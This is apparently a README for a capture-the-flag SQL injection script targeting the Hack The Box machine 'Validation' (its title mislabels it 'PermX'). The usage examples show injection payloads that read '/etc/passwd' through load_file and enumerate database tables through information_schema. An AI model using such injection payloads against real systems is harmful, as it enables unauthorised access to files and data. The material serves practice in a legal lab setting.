# HTB PermX

Script for [HTB Validation](https://www.hackthebox.com/machines/validation) for SQL Injection.

## Usage

```shell-session
❯ python3 sql_injection.py <injection command> 
```

For example:
```
❯ python3 sql_injection.py 'user()'

❯ python3 sql_injection.py 'load_file("/etc/passwd")'

❯ python3 sql_injection.py 'concat(table_name, ":") from information_schema.tables where table_schema = "registration"'
```
